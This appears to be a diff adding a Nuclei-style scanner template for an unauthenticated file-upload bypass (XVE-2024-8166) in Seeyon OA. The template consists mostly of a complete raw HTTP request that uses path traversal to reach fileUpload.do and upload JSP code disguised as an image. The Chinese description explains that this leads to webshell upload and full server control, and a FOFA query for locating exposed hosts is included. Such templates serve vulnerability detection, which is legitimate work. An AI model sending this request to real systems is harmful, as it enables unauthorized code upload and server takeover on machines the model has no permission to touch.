@@ -1,0 +1,69 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - '{{username}}.png'
+            - 'Content-Type: application/pdf'
+            - fileurls=fileurls
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1
+          Host: your-ip
+          Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+          Content-Type: multipart/form-data; boundary=00content0boundary00
+          User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)
+
+          --00content0boundary00
+          Content-Disposition: form-data; name="type"
+
+
+          --00content0boundary00
+          Content-Disposition: form-data; name="extensions"
+
+          png
+          --00content0boundary00
+          Content-Disposition: form-data; name="applicationCategory"
+
+
+          --00content0boundary00
+          Content-Disposition: form-data; name="destDirectory"
+
+
+          --00content0boundary00
+          Content-Disposition: form-data; name="destFilename"
+
+
+          --00content0boundary00
+          Content-Disposition: form-data; name="maxSize"
+
+
+          --00content0boundary00
+          Content-Disposition: form-data; name="isEncrypt"
+
+          false
+          --00content0boundary00
+          Content-Disposition: form-data; name="file1"; filename="{{username}}.png"
+          Content-Type: Content-Type: application/pdf
+
+          <% out.println("pboyjnnrfipmplsukdeczudsefxmywe");%>
+          --00content0boundary00--
+id: zhiyuanOA-fileUpload_do-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: title="协同管理软件 V5.6SP1"
+        致远OA 接口 fileUpload.do 接口处存在文件上传漏洞，未经身份验证的远程攻击者可通过目录遍历的方式绕过上传接口限制，并利用menu.do接口替换上传文件的fileid值实现webshell上传到服务器，获取服务器权限，控制整个 web 服务器。
+    name: 致远OA fileUpload.do 前台文件上传绕过漏洞(XVE-2024-8166)
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488662&idx=1&sn=5e24fd004a5ebacef3e2aef079cbf80e&chksm=c267a1a5f51028b3711b72de4c64f7d7b59919977819241d490cd000f7569f7dad669fab1a75&token=555018471&lang=zh_CN#rd
+    severity: high
+    tags:
+        - Oce
+variables:
+    username: '{{to_lower(rand_base(6))}}'
